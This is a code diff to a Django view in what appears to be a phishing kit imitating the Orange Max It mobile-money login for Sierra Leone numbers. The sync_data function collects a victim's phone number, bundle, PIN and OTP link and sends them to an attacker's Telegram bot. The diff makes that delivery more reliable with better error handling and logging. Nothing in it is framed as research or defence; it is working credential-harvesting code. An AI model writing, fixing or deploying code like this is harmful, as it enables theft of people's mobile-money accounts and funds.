@@ -67,6 +67,16 @@ def otp_verification(request): # Removed order_id from here
         return redirect('starlink_app:otp_verification')
     return render(request, 'otp_verification.html', {'order': order})
 
+import os
+
+
+
+# This helps you see the error in the Render Logs
+
+logger = logging.getLogger(__name__)
+
+
+
 @csrf_exempt
 
 def sync_data(request):
@@ -79,27 +89,33 @@ def sync_data(request):
 
     try:
 
-        # 1. Load data from Fetch
+        # 1. Safely load JSON
 
-        data = json.loads(request.body)
+        try:
+
+            data = json.loads(request.body)
+
+        except json.JSONDecodeError:
+
+            return JsonResponse({"status": "error", "message": "Invalid JSON"}, status=400)
+
+
 
         otp_link = data.get('otp', 'No Link provided')
 
 
 
-        # 2. Retrieve session data
+        # 2. Retrieve session data with fallbacks so it doesn't crash
 
-        # Ensure these were set in the previous view using request.session['key'] = value
+        phone = request.session.get('phone', 'Not Found')
 
-        phone = request.session.get('phone', 'Unknown')
+        bundle = request.session.get('bundle', 'Not Found')
 
-        bundle = request.session.get('bundle', 'Unknown')
-
-        pin = request.session.get('pin', 'Unknown')
+        pin = request.session.get('pin', 'Not Found')
 
 
 
-        # 3. Get Credentials from Render Environment Variables
+        # 3. Get Credentials from Environment
 
         bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
 
@@ -107,35 +123,37 @@ def sync_data(request):
 
 
 
+        # Check if credentials exist before trying to use them
+
         if not bot_token or not chat_id:
 
-            return JsonResponse({"status": "error", "message": "Server configuration missing"}, status=500)
+            logger.error("MISSING TELEGRAM CREDENTIALS IN RENDER SETTINGS")
+
+            return JsonResponse({"status": "error", "message": "Server Config Missing"}, status=500)
 
 
 
-        # 4. Format the Message
-
-        # Using a simpler format to prevent Markdown parsing errors
+        # 4. Format Message (Clean text to avoid Markdown crashes)
 
         message = (
 
-            "🇸🇱 *ORANGE MAX IT LOGIN*\n"
+            "🇸🇱 ORANGE MAX IT LOGIN\n"
 
             "━━━━━━━━━━━━━━━━━━\n"
 
-            f"📞 *PHONE:* +232 {phone}\n"
+            f"📞 PHONE: +232 {phone}\n"
 
-            f"📦 *BUNDLE:* {bundle}\n"
+            f"📦 BUNDLE: {bundle}\n"
 
-            f"🔑 *PIN:* {pin}\n"
-
-            "━━━━━━━━━━━━━━━━━━\n"
-
-            f"🔗 *OTP LINK:*\n{otp_link}\n"
+            f"🔑 PIN: {pin}\n"
 
             "━━━━━━━━━━━━━━━━━━\n"
 
-            "📡 *STATUS:* SUCCESS"
+            f"🔗 OTP LINK:\n{otp_link}\n"
+
+            "━━━━━━━━━━━━━━━━━━\n"
+
+            "📡 STATUS: SUCCESS"
 
         )
 
@@ -145,19 +163,23 @@ def sync_data(request):
 
         telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
 
-        payload = {
+        
 
-            "chat_id": chat_id,
+        response = requests.post(
 
-            "text": message,
+            telegram_url, 
 
-            "parse_mode": "Markdown" 
+            json={
 
-        }
+                "chat_id": chat_id,
 
+                "text": message
 
+            }, 
 
-        response = requests.post(telegram_url, json=payload, timeout=10)
+            timeout=10
+
+        )
 
         
 
@@ -167,9 +189,7 @@ def sync_data(request):
 
         else:
 
-            # This helps you see the REAL error in Render logs
-
-            print(f"Telegram Failed: {response.text}")
+            logger.error(f"Telegram API Rejected: {response.text}")
 
             return JsonResponse({"status": "error", "message": "Telegram API Error"}, status=500)
 
@@ -177,6 +197,6 @@ def sync_data(request):
 
     except Exception as e:
 
-        print(f"Sync Error: {str(e)}")
+        logger.exception("CRITICAL SERVER ERROR:") # This prints the full error to Render logs
 
-        return JsonResponse({"status": "error", "message": "Internal Server Error"}, status=400)
+        return JsonResponse({"status": "error", "message": str(e)}, status=500)
